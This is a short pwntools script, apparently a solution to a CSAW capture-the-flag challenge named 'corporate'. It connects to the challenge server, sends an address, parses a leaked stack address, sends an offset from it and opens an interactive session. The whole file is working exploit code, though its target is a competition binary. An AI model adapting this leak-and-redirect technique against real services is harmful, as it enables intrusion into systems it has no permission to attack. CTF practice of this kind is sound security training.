from pwn import *

e = ELF("./corporate")
#p = process(e.path)
p = remote("rev.chal.csaw.io", 1001)

p.sendline(str(0x8048ce5))
p.recvuntil("images:")
p.recvline()
p.recvuntil("0x")

stk = int(p.recvuntil(" ", drop=True), 16)
print("{:#x}".format(stk + 0x34))
p.sendline(str(stk + 0x34))


p.interactive()
